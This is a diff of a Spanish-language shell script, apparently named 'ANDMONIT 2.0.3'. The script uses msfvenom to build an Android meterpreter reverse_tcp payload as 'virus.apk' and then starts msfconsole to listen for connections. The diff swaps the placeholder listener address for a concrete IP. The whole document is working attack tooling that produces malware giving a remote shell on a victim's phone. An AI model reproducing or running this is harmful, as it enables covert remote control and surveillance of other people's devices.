@@ -22,7 +22,7 @@ sleep 1
 clear
 figlet ANDMONIT 2.0.3
 echo [!]CREANDO APK...
-sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=TU_IP LPORT=555 R > virus.apk
+sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.23 LPORT=555 R > virus.apk
 echo APK CREADA CON EXITO!
 echo [!]MONITOREANDO APK...
 sudo msfconsole -r android.rc
